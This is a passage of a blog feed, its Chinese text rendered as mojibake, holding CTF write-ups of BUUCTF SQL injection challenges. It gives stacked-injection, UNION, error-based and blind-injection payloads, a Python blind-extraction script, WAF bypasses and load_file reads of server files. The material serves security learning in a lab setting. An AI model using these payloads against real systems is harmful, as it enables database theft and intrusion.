            <tag> ä»£ç æ³¨å…¥ </tag>
            
            <tag> å‘½ä»¤æ‰§è¡Œ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>buuctfåˆ·é¢˜-sqlæ³¨å…¥ç¯‡</title>
      <link href="2020/01/16/buuctf%E5%88%B7%E9%A2%98-sql%E6%B3%A8%E5%85%A5%E7%AF%87/"/>
      <url>2020/01/16/buuctf%E5%88%B7%E9%A2%98-sql%E6%B3%A8%E5%85%A5%E7%AF%87/</url>
      
        <content type="html"><![CDATA[<p>æœ¬ç¯‡åšå®¢ä¸»è¦è®°å½•äº†buuctfä¸Šwebéƒ¨åˆ†sqlæ³¨å…¥ç±»å‹é¢˜ç›®çš„writeupï¼æŒç»­æ›´æ–°ï¼</p><a id="more"></a><h2 id="å¼ºç½‘æ¯-2019-éšä¾¿æ³¨"><a href="#å¼ºç½‘æ¯-2019-éšä¾¿æ³¨" class="headerlink" title="[å¼ºç½‘æ¯ 2019]éšä¾¿æ³¨"></a>[å¼ºç½‘æ¯ 2019]éšä¾¿æ³¨</h2><h3 id="writeup"><a href="#writeup" class="headerlink" title="writeup"></a>writeup</h3><p>å¯ä»¥çœ‹åˆ°è¿‡æ»¤äº†å¾ˆå¤šä¸œè¥¿</p><img src="/2020/01/16/buuctf%E5%88%B7%E9%A2%98-sql%E6%B3%A8%E5%85%A5%E7%AF%87/è¿‡æ»¤.png" style="zoom: 67%;"><p>è¿™é¢˜è€ƒå¯Ÿçš„æ˜¯å †å æ³¨å…¥ï¼Œå› æ­¤æˆ‘ä»¬å¯ä»¥å…ˆæŸ¥è¯¢ä¸‹æ•°æ®åº“</p><img src="/2020/01/16/buuctf%E5%88%B7%E9%A2%98-sql%E6%B3%A8%E5%85%A5%E7%AF%87/æ•°æ®åº“.png" style="zoom: 67%;"><p>ä¸ç»•å¼¯å­ï¼Œflagåœ¨supersqlié‡Œçš„1919810931114514è¡¨é‡Œï¼Œç°åœ¨æœ‰ä¸¤ç§æ–¹æ³•å¯ä»¥å¾—åˆ°flag</p><h4 id="æ–¹å¼1"><a href="#æ–¹å¼1" class="headerlink" title="æ–¹å¼1"></a>æ–¹å¼1</h4><p>ä½¿ç”¨prepareå’Œexecuteæ¥æ„é€ è¯­å¥ä»è€Œç»•è¿‡è¿‡æ»¤ï¼Œpayloadå¦‚ä¸‹ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?inject=<span class="number">1</span><span class="string">&#x27;%3BSet%40a%3D0x73656c656374202a2066726f6d20603139313938313039333131313435313460%3Bprepare+b+from+%40a%3Bexecute+b%3B%23</span></span><br></pre></td></tr></table></figure><p>urlè§£ç åæ˜¯ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span><span class="string">&#x27;;Set@a=0x73656c656374202a2066726f6d20603139313938313039333131313435313460;prepare b from @a;execute b;#</span></span><br></pre></td></tr></table></figure><p>å…¶ä¸­é‚£æ®µ16è¿›åˆ¶å­—ç¬¦ä¸²çš„æ„æ€æ˜¯</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> * <span class="keyword">from</span> <span class="string">`1919810931114514`</span></span><br></pre></td></tr></table></figure><p>ç±»ä¼¼çš„payloadè¿˜æœ‰</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&#x27;;use supersqli;set @sql=concat(&#x27;</span>s<span class="string">&#x27;,&#x27;</span>elect `flag` <span class="keyword">from</span> `<span class="number">1919810931114514</span>`<span class="string">&#x27;);PREPARE stmt1 FROM @sql;EXECUTE stmt1;</span></span><br></pre></td></tr></table></figure><h4 id="æ–¹å¼2"><a href="#æ–¹å¼2" class="headerlink" title="æ–¹å¼2"></a>æ–¹å¼2</h4><p>è¿™ç§æ€è·¯ç®—æ˜¯éªšå¥—è·¯äº†</p><p>é¢˜ç›®ç¯å¢ƒç”¨çš„æ•°æ®åº“å’Œflagæ‰€åœ¨çš„æ•°æ®åº“ä¸€æ ·ï¼Œéƒ½æ˜¯supersqliï¼Œåªä¸è¿‡ä¸¤ä¸ªè¡¨ä¸åŒï¼Œå› æ­¤æˆ‘ä»¬å¯ä»¥æ”¹ä¸‹è¡¨çš„åå­—ï¼Œå…ˆçœ‹ä¸‹è¡¨çš„ç»“æ„</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span><span class="string">&#x27;;use supersqli;show tables;show columns from `1919810931114514`;#</span></span><br><span class="line"><span class="string">1&#x27;</span>;<span class="keyword">use</span> <span class="title">supersqli</span>;show tables;show columns <span class="keyword">from</span> words;<span class="comment">#</span></span><br></pre></td></tr></table></figure><img src="/2020/01/16/buuctf%E5%88%B7%E9%A2%98-sql%E6%B3%A8%E5%85%A5%E7%AF%87/æ•°å­—è¡¨ç»“æ„.png" style="zoom:67%;"><img src="/2020/01/16/buuctf%E5%88%B7%E9%A2%98-sql%E6%B3%A8%E5%85%A5%E7%AF%87/TIMæˆªå›¾20200114165010.png" style="zoom:67%;"><p>å‘ç°æ•°å­—è¡¨åªæœ‰flagè¿™ä¸€åˆ—ï¼Œè€Œé¢˜ç›®æ‰€ä½¿ç”¨çš„è¡¨æœ‰id,dataä¸¤åˆ—ï¼Œå› æ­¤æˆ‘ä»¬å¯ä»¥å¾€æ•°å­—è¡¨é‡Œæ’å…¥ä¸€ä¸ªåä¸ºidçš„åˆ—ï¼Œç„¶åå°†flagåˆ—é‡æ–°å‘½åä¸ºdataï¼Œå†å°†æ•°å­—è¡¨åæ”¹ä¸ºwordsï¼ŒæŠŠwordsè¡¨æ”¹æˆå…¶å®ƒåç§°ï¼Œpayload:</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#x27;;<span class="keyword">RENAME</span> <span class="keyword">TABLE</span> <span class="string">`words`</span> <span class="keyword">TO</span> <span class="string">`test666`</span>;<span class="keyword">RENAME</span> <span class="keyword">TABLE</span> <span class="string">`1919810931114514`</span> <span class="keyword">TO</span> <span class="string">`words`</span>;<span class="keyword">ALTER</span> <span class="keyword">TABLE</span> <span class="string">`words`</span> <span class="keyword">ADD</span> <span class="keyword">COLUMN</span> <span class="keyword">id</span> <span class="built_in">INT</span>(<span class="number">11</span>);<span class="comment">#</span></span><br></pre></td></tr></table></figure><img src="/2020/01/16/buuctf%E5%88%B7%E9%A2%98-sql%E6%B3%A8%E5%85%A5%E7%AF%87/TIMæˆªå›¾20200114171454.png" style="zoom:67%;"><p>æ³¨æ„æ•°å­—è¡¨è¦åŠ åå¼•å·ï¼Œidå› ä¸ºæ˜¯åˆšæ’å…¥çš„ï¼Œåº”è¯¥ä¸ºç©ºï¼Œæ‰€ä»¥éœ€è¦åŠ ä¸ª<code>or 1=1#</code></p><h2 id="SUCTF-2019-EasySQL"><a href="#SUCTF-2019-EasySQL" class="headerlink" title="[SUCTF 2019]EasySQL"></a>[SUCTF 2019]EasySQL</h2><h3 id="writeup-1"><a href="#writeup-1" class="headerlink" title="writeup"></a>writeup</h3><p>åŒæ ·æ˜¯å †å æ³¨å…¥ï¼ŒæŒ‰ç…§ä»¥å‰çš„æ€è·¯å‘ç°èƒ½æ³¨å‡ºæ•°æ®åº“ä¸ºctfï¼Œè¡¨ä¸ºFlagï¼Œå­—æ®µå°±æ²¡åŠæ³•äº†</p><p>ä¸ç»•å¼¯å­ï¼Œåå°sqlè¯­å¥ï¼š</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> $_POST[<span class="string">&#x27;query&#x27;</span>]||flag <span class="keyword">from</span> Flag</span><br></pre></td></tr></table></figure><p>è§£é¢˜payload:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1;set sql_mode&#x3D;PIPES_AS_CONCAT;select 1</span><br></pre></td></tr></table></figure><p>ç›¸å½“äºæ‰§è¡Œï¼š</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="number">1</span>;<span class="keyword">set</span> sql_mode=PIPES_AS_CONCAT;<span class="keyword">select</span> <span class="number">1</span>||flag <span class="keyword">from</span> Flag</span><br></pre></td></tr></table></figure><img src="/2020/01/16/buuctf%E5%88%B7%E9%A2%98-sql%E6%B3%A8%E5%85%A5%E7%AF%87/TIMæˆªå›¾20200213135340.png" style="zoom: 80%;"><p><code>sql_modesql_mode</code>ï¼šæ˜¯ä¸€ç»„mysqlæ”¯æŒçš„åŸºæœ¬è¯­æ³•åŠæ ¡éªŒè§„åˆ™ï¼Œ<code>PIPES_AS_CONCAT</code>ï¼šå°†â€œ||â€è§†ä¸ºå­—ç¬¦ä¸²çš„è¿æ¥æ“ä½œç¬¦è€Œéæˆ–è¿ç®—ç¬¦ï¼Œè¿™å’ŒOracleæ•°æ®åº“æ˜¯ä¸€æ ·çš„ï¼Œä¹Ÿå’Œå­—ç¬¦ä¸²çš„æ‹¼æ¥å‡½æ•°Concatç›¸ç±»ä¼¼</p><p>è¿˜æœ‰ä¸ªpayload:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">*,1</span><br></pre></td></tr></table></figure><p>ç›¸å½“äºæ‰§è¡Œ:</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> *,<span class="number">1</span>||flag <span class="keyword">from</span> Flag</span><br></pre></td></tr></table></figure><img src="/2020/01/16/buuctf%E5%88%B7%E9%A2%98-sql%E6%B3%A8%E5%85%A5%E7%AF%87/TIMæˆªå›¾20200213135531.png" style="zoom:80%;"><h2 id="CISCN2019-ååŒ—èµ›åŒº-Day2-Web1-Hack-World"><a href="#CISCN2019-ååŒ—èµ›åŒº-Day2-Web1-Hack-World" class="headerlink" title="[CISCN2019 ååŒ—èµ›åŒº Day2 Web1]Hack World"></a>[CISCN2019 ååŒ—èµ›åŒº Day2 Web1]Hack World</h2><h3 id="writeup-2"><a href="#writeup-2" class="headerlink" title="writeup"></a>writeup</h3><p>æ‰“å¼€é¢˜ç›®æç¤ºflagåœ¨flagè¡¨flagå­—æ®µé‡Œï¼Œboolç›²æ³¨ï¼Œexp:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url=<span class="string">&quot;http://fea4ab1f-7bf4-452f-9c2a-83dadf6f6315.node3.buuoj.cn&quot;</span></span><br><span class="line">flag=<span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">50</span>):</span><br><span class="line">f1=flag</span><br><span class="line">top=<span class="number">127</span></span><br><span class="line">low=<span class="number">33</span></span><br><span class="line"><span class="keyword">while</span> low&lt;=top:</span><br><span class="line">mid=(top+low)//<span class="number">2</span></span><br><span class="line">data=&#123;<span class="string">&#x27;id&#x27;</span>:<span class="string">&#x27;if(ascii(substr((select(flag)from(flag)),&#123;&#125;,1))&gt;&#123;&#125;,1,0)&#x27;</span>.format(str(i),str(mid))&#125;</span><br><span class="line">data1=&#123;<span class="string">&#x27;id&#x27;</span>:<span class="string">&#x27;if(ascii(substr((select(flag)from(flag)),&#123;&#125;,1))=&#123;&#125;,1,0)&#x27;</span>.format(str(i),str(mid))&#125;</span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">r1=requests.post(url,data=data1)</span><br><span class="line">print(i,mid)</span><br><span class="line"><span class="keyword">if</span> <span class="string">&#x27;glzjin&#x27;</span> <span class="keyword">in</span> r1.text:</span><br><span class="line">flag+=chr(mid)</span><br><span class="line">print(flag)</span><br><span class="line"><span class="keyword">break</span></span><br><span class="line">r=requests.post(url,data=data)</span><br><span class="line"><span class="keyword">if</span> <span class="string">&quot;Error&quot;</span> <span class="keyword">in</span> r.text:</span><br><span class="line">top=mid<span class="number">-1</span></span><br><span class="line"><span class="keyword">if</span> <span class="string">&#x27;glzjin&#x27;</span> <span class="keyword">in</span> r.text:</span><br><span class="line">low=mid+<span class="number">1</span></span><br><span class="line"><span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line"><span class="keyword">pass</span></span><br><span class="line"><span class="keyword">if</span> flag==f1:</span><br><span class="line"><span class="keyword">break</span></span><br></pre></td></tr></table></figure><p>è¿˜æœ‰ç§payloadï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id&#x3D;1^(if(ascii(substr((select(flag)from(flag)),1,1))&#x3D;100,1,0))</span><br></pre></td></tr></table></figure><h2 id="ç½‘é¼æ¯-2018-Fakebook"><a href="#ç½‘é¼æ¯-2018-Fakebook" class="headerlink" title="[ç½‘é¼æ¯ 2018]Fakebook"></a>[ç½‘é¼æ¯ 2018]Fakebook</h2><h3 id="writeup-3"><a href="#writeup-3" class="headerlink" title="writeup"></a>writeup</h3><p>æ‰«ç›®å½•ï¼Œå‘ç°<code>flag.php</code>å’Œ<code>robots.txt</code>ï¼Œè®¿é—®çœ‹åˆ°<code>user.php.bak</code>ï¼Œå¾—åˆ°</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">UserInfo</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $name = <span class="string">&quot;&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> $age = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">public</span> $blog = <span class="string">&quot;&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params">$name, $age, $blog</span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;name = $name;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;age = (<span class="keyword">int</span>)$age;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;blog = $blog;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">get</span>(<span class="params">$url</span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        $ch = curl_init();</span><br><span class="line"></span><br><span class="line">        curl_setopt($ch, CURLOPT_URL, $url);</span><br><span class="line">        curl_setopt($ch, CURLOPT_RETURNTRANSFER, <span class="number">1</span>);</span><br><span class="line">        $output = curl_exec($ch);</span><br><span class="line">        $httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE);</span><br><span class="line">        <span class="keyword">if</span>($httpCode == <span class="number">404</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="number">404</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        curl_close($ch);</span><br><span class="line">        <span class="keyword">return</span> $output;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getBlogContents</span> (<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;get(<span class="keyword">$this</span>-&gt;blog);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">isValidBlog</span> (<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        $blog = <span class="keyword">$this</span>-&gt;blog;</span><br><span class="line">        <span class="keyword">return</span> preg_match(<span class="string">&quot;/^(((http(s?))\:\/\/)?)([0-9a-zA-Z\-]+\.)+[a-zA-Z]&#123;2,6&#125;(\:[0-9]+)?(\/\S*)?$/i&quot;</span>, $blog);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>éšä¾¿æ³¨å†Œä¸ªè´¦å·è¿›å»ï¼Œåœ¨<code>view.php?no=</code>å‘ç°å­˜åœ¨æ³¨å…¥</p><p><code>order by</code> åˆ¤æ–­å‡ºæœ‰å››åˆ—ï¼Œè¯•äº†è¯•è”åˆæŸ¥è¯¢ï¼Œå‘ç°ç›´æ¥<code>union select</code>è¢«wafæ‹¦äº†</p><p>å°è¯• <code>union/**/select</code>å‘ç°å¯ä»¥æˆåŠŸç»•è¿‡ï¼Œåˆ¤æ–­å›æ˜¾ä½ï¼Œå‘ç°æ˜¯ç¬¬äºŒä½</p><img src="/2020/01/16/buuctf%E5%88%B7%E9%A2%98-sql%E6%B3%A8%E5%85%A5%E7%AF%87/TIMæˆªå›¾20200406104336.png" style="zoom:80%;"><p>æ¥ç€å°±æ˜¯çˆ†æ•°æ®åº“ï¼Œè¡¨ï¼Œåˆ—</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">view.php?no=<span class="number">-1</span> union<span class="comment">/**/</span>select <span class="number">1</span>,group_concat(schema_name),<span class="number">3</span>,<span class="number">4</span> <span class="keyword">from</span> information_schema.schemata%<span class="number">23</span></span><br><span class="line"><span class="comment"># å¾—åˆ°fakebook,information_schema,mysql,performance_schema,test</span></span><br><span class="line">view.php?no=<span class="number">-1</span> union<span class="comment">/**/</span>select <span class="number">1</span>,group_concat(table_name),<span class="number">3</span>,<span class="number">4</span> <span class="keyword">from</span> information_schema.tables where table_schema=database()%<span class="number">23</span></span><br><span class="line"><span class="comment"># å¾—åˆ°users</span></span><br><span class="line">view.php?no=<span class="number">-1</span> union<span class="comment">/**/</span>select <span class="number">1</span>,group_concat(column_name),<span class="number">3</span>,<span class="number">4</span> <span class="keyword">from</span> information_schema.columns where table_name=<span class="string">&#x27;users&#x27;</span> <span class="keyword">and</span> table_schema=database()%<span class="number">23</span></span><br><span class="line"><span class="comment"># å¾—åˆ°no,username,passwd,data </span></span><br><span class="line">view.php?no=<span class="number">-1</span> union<span class="comment">/**/</span>select <span class="number">1</span>,concat(no,<span class="string">&#x27; &#x27;</span>,username,<span class="string">&#x27; &#x27;</span>,passwd,<span class="string">&#x27; &#x27;</span>,data),<span class="number">3</span>,<span class="number">4</span> <span class="keyword">from</span> fakebook.users where no=<span class="number">1</span>%<span class="number">23</span></span><br></pre></td></tr></table></figure><p>å‘ç°ç”¨16è¿›åˆ¶åˆ†å‰²çš„æ—¶å€™ä¼šè¢«wafæ‹¦ï¼Œç›´æ¥ç”¨ç©ºæ ¼å­—ç¬¦ä¸²</p><img src="/2020/01/16/buuctf%E5%88%B7%E9%A2%98-sql%E6%B3%A8%E5%85%A5%E7%AF%87/TIMæˆªå›¾20200406110341.png" style="zoom:80%;"><p>å‘ç°æœ€åä¸€åˆ—çš„å€¼æ˜¯åºåˆ—åŒ–çš„ç»“æœï¼Œåº”è¯¥å’Œå‰é¢çš„æºç æ³„éœ²æœ‰å…³</p><p>æ³¨å…¥è¿™é‡Œä¹Ÿå¯ä»¥ç”¨æŠ¥é”™æ³¨å…¥</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">view.php?no=<span class="number">-1</span> <span class="keyword">and</span> extractvalue(<span class="number">1</span>,concat(<span class="number">1</span>,database()))%<span class="number">23</span></span><br><span class="line"></span><br><span class="line">view.php?no=<span class="number">-1</span> <span class="keyword">and</span> extractvalue(<span class="number">1</span>,concat(<span class="number">1</span>,(select group_concat(table_name) <span class="keyword">from</span> information_schema.tables where table_schema=database())))%<span class="number">23</span></span><br><span class="line"></span><br><span class="line">view.php?no=<span class="number">-1</span> <span class="keyword">and</span> extractvalue(<span class="number">1</span>,concat(<span class="number">1</span>,(select group_concat(column_name) <span class="keyword">from</span> information_schema.columns where table_schema=database() <span class="keyword">and</span> table_name=<span class="string">&#x27;users&#x27;</span>)))%<span class="number">23</span></span><br><span class="line"></span><br><span class="line">view.php?no=<span class="number">-1</span> <span class="keyword">and</span> extractvalue(<span class="number">1</span>,concat(<span class="number">1</span>,(select group_concat(data) <span class="keyword">from</span> fakebook.users where no=<span class="number">1</span>)))%<span class="number">23</span></span><br></pre></td></tr></table></figure><p>åœ¨çˆ†å†…å®¹çš„æ—¶å€™å‘ç°ä¸å…¨ï¼Œè¿™æ˜¯å› ä¸ºæŠ¥é”™æ³¨å…¥é•¿åº¦é™åˆ¶ï¼Œé»˜è®¤ä¸º32ä¸ªå­—ç¬¦ï¼Œæˆ‘ä»¬å…ˆç”¨lengthçˆ†ä¸€ä¸‹é•¿åº¦ï¼Œå†ç”¨left,right,reverseæ¥çœ‹åˆ°å…¨éƒ¨å†…å®¹</p><p><img src="/2020/01/16/buuctf%E5%88%B7%E9%A2%98-sql%E6%B3%A8%E5%85%A5%E7%AF%87/TIM%E6%88%AA%E5%9B%BE20200406112742.png"></p><p>çœ‹å…¶ä»–å¤§ä½¬çš„æ“ä½œï¼Œè¿˜å¯ä»¥ç”¨make_setå‡½æ•°ï¼Œä¹‹å‰æ²¡ç”¨è¿‡ï¼Œè¿™é‡Œè®°ä¸€ä¸‹</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">view.php?no=<span class="number">1</span> <span class="keyword">and</span> updatexml(<span class="number">1</span>,make_set(<span class="number">3</span>,<span class="string">&#x27;~&#x27;</span>,(select group_concat(table_name) <span class="keyword">from</span> information_schema.tables where table_schema=database())),<span class="number">1</span>)<span class="comment">#</span></span><br><span class="line"><span class="comment"># å›æ˜¾å‰ä¸¤åˆ—</span></span><br></pre></td></tr></table></figure><img src="/2020/01/16/buuctf%E5%88%B7%E9%A2%98-sql%E6%B3%A8%E5%85%A5%E7%AF%87/TIMæˆªå›¾20200406113240.png" style="zoom:80%;"><p>è¯¦ç»†å¯ä»¥çœ‹ï¼š<a href="https://blog.csdn.net/qq_41725312/article/details/83039525">https://blog.csdn.net/qq_41725312/article/details/83039525</a></p><p>é¢˜ç›®å¯ä»¥ç›´æ¥load_fileè¯»æ–‡ä»¶</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">view.php?no=<span class="number">-1</span> union<span class="comment">/**/</span>select <span class="number">1</span>,load_file(<span class="string">&#x27;/var/www/html/index.php&#x27;</span>),<span class="number">3</span>,<span class="number">4</span>%<span class="number">23</span></span><br></pre></td></tr></table></figure><p>ç›´æ¥è¯»<code>flag.php</code>å¯ä»¥å¾—åˆ°flag</p><p><img src="/2020/01/16/buuctf%E5%88%B7%E9%A2%98-sql%E6%B3%A8%E5%85%A5%E7%AF%87/TIM%E6%88%AA%E5%9B%BE20200406113721.png"></p><p>è¯»<code>index.php</code>å‘ç°å­˜åœ¨ååºåˆ—åŒ–</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">foreach</span> ($db-&gt;getAllUsers() <span class="keyword">as</span> $user)</span><br><span class="line">&#123;</span><br><span class="line">$data = unserialize($user[<span class="string">&#x27;data&#x27;</span>]);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;tr&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;td&gt;<span class="subst">&#123;$user[&#x27;no&#x27;]&#125;</span>&lt;/td&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;td&gt;&lt;a href=&#x27;view.php?no=<span class="subst">&#123;$user[&#x27;no&#x27;]&#125;</span>&#x27;&gt;<span class="subst">&#123;$user[&#x27;username&#x27;]&#125;</span>&lt;/a&gt;&lt;/td&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;td&gt;<span class="subst">&#123;$data-&gt;age&#125;</span>&lt;/td&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;td&gt;<span class="subst">&#123;$data-&gt;blog&#125;</span>&lt;/td&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;/tr&gt;\n&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>æ¥ç€æˆ‘ä»¬åˆåœ¨<code>view.php</code>å‘ç°å­˜åœ¨å’Œä¸Šé¢ä¸€æ ·çš„ååºåˆ—åŒ–ï¼Œå¹¶è°ƒç”¨äº†userç±»é‡Œçš„getBlogContentsæ–¹æ³•ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$no = $_GET[<span class="string">&#x27;no&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span> ($db-&gt;anti_sqli($no))</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;no hack ~_~&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line">$res = $db-&gt;getUserByNo($no);</span><br><span class="line">$user = unserialize($res[<span class="string">&#x27;data&#x27;</span>]);</span><br><span class="line"><span class="comment">//print_r($res);</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">    </span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$response = $user-&gt;getBlogContents();</span><br><span class="line"><span class="keyword">if</span> ($response === <span class="number">404</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;404 Not found&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line">$base64 = base64_encode($response);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;iframe width=&#x27;100%&#x27; height=&#x27;10em&#x27; src=&#x27;data:text/html;base64,<span class="subst">&#123;$base64&#125;</span>&#x27;&gt;&quot;</span>;</span><br><span class="line"><span class="comment">// echo $response;</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// var_dump($user-&gt;getBlogContents());</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>æ‹ä¸‹æ€è·¯ï¼Œindex.phpä¼šè·å–æ‰€æœ‰ç”¨æˆ·ï¼Œå¹¶æŠŠæ•°æ®åº“ä¸­dataå­—æ®µååºåˆ—åŒ–ï¼Œview.phpä¼šè®¿é—®ä¹‹å‰ç•™çš„blogé“¾æ¥çš„å†…å®¹ï¼Œè€Œåœ¨index.phpé‚£é‡Œå­˜åœ¨æ­£åˆ™è¿‡æ»¤ï¼Œæˆ‘ä»¬æ— æ³•åœ¨blogæ’å…¥<code>file://</code>åè®®è¯»æºç çš„ä»£ç 